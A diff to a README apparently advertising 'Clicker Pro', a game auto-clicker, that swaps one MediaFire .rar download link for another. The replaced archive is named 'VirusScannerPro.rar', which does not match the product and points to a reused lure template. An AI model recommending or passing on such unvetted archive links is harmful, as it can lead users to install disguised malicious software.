@@ -42,7 +42,7 @@ Tired of clicking constantly? Want to kill monsters faster? **Clicker Pro** is t
 
 ## 📥 Download Clicker Pro
 
-[⬇️ Download Clicker Pro](https://www.mediafire.com/file/buamf0lcdywca0b/VirusScannerPro.rar/file)
+[⬇️ Download Clicker Pro](https://www.mediafire.com/file/7iu7xe54biu55wa/Clicker_Pro.rar/file)
 
 ---
 
